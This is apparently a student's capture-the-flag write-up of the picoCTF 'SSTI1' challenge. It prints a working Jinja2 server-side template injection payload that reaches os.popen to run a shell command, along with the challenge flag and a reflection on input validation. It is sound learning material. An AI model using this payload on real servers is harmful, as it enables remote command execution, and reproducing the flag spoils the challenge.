# Module-Web Exploiatation
## Challenge 1-SSTI1
## What I did
```
I looked up pyjail ssti1. Thereafter, I came upon {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}}. I pasted this on the website, which gave me the flag.
```
## Flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_09365533}
## What I learned
In the SSTI1 challenge, I learned how Server-Side Template Injection (SSTI) vulnerabilities work and how they can be exploited when user input is unsafely embedded into server-side templates. By experimenting with different payloads, I discovered how template engines like Jinja2 can unintentionally execute code if input isn’t properly sanitized. This taught me the importance of input validation and using safe rendering methods. Overall, the challenge helped me understand how even simple-looking web forms can expose serious security flaws if user input directly interacts with backend logic.


